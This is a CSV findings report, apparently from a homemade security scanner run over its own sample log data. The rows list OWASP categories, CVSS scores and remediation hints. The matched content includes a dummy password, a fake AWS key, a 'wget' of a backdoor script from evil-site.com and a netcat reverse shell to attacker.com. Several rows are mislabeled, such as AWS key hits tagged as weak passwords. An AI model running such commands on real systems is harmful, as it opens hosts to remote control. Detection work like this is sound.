Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
password_assignment,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1869,"""content"": ""password=12345"""
password_assignment,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1877,"""content"": ""password=12345"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1906,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1914,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1922,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1930,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1938,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1946,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1954,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1962,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1970,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1978,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1986,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1994,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2002,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2031,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2039,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2047,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2055,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2063,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2071,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2079,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2087,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2095,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2103,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2111,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2119,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2127,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2156,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2164,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2172,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2180,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2188,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2196,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2204,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2212,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2220,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2228,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2236,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2244,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2252,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2281,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2289,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2297,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2305,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2313,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2321,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2329,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2337,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2345,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2353,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2361,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2369,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2377,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2406,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
